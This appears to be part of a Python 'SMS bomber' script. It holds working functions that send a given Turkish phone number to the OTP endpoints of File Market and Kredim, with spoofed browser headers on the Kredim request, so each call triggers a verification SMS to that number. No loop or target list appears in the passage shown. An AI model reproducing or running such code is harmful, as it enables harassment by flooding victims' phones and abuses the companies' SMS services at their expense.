# file market
def file(number):
    try:
        url = "https://api.filemarket.com.tr/v1/otp/send"
        payload = {
            "mobilePhoneNumber": f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["data"]
        if r1 == "200 OK":
            return True, "File"
        else:
            return False, "File"
    except:
        return False, "File"
    

# KREDİM
def send_sms(gsm: str):
    url = "https://api.kredim.com.tr/api/v1/Communication/SendOTP"
    headers = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "https://member.kredim.com.tr",
        "referer": "https://member.kredim.com.tr/",
        "user-agent": "Mozilla/5.0"
    }
    payload = {
        "source": "Register",
        "type": 8,
        "gsmNumber": f"+90{gsm}",
        "templateCode": "VerifyMember",
        "originator": "OTP|KREDIM"
    }

    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        if response.status_code == 200:
            return {
                "success": True,
                "message": "SMS gönderimi başarılı!",
                "response": response.text
            }
        else:
            return {
                "success": False,
                "message": "SMS gönderimi sırasında hata oluştu!",
                "code": response.status_code,
                "response": response.text
            }
    except requests.exceptions.RequestException as e:
        return {
            "success": False,
            "message": "İstek hatası oluştu!",
            "error": str(e)
        }

